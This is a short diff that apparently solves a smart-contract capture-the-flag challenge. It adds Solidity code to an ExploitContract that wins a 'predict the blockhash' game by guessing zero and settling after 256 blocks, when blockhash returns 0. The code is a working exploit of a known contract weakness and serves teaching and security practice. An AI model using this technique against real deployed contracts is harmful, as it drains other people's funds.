@@ -53,4 +53,15 @@ contract ExploitContract {
     }
 
     // write your exploit code below
+    // bockhash is only retrievablefrom solidity for the past 255 blocks
+    // after which point the blockhash operator will return 0
+    // so we guess the blockhash of 0 and then call settle after 256 blocks
+    function exploit() public payable {
+        bytes32 guess = 0;
+        predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
+    }
+    function settle() public {
+        predictTheBlockhash.settle();
+    }
+    receive() external payable {}
 }
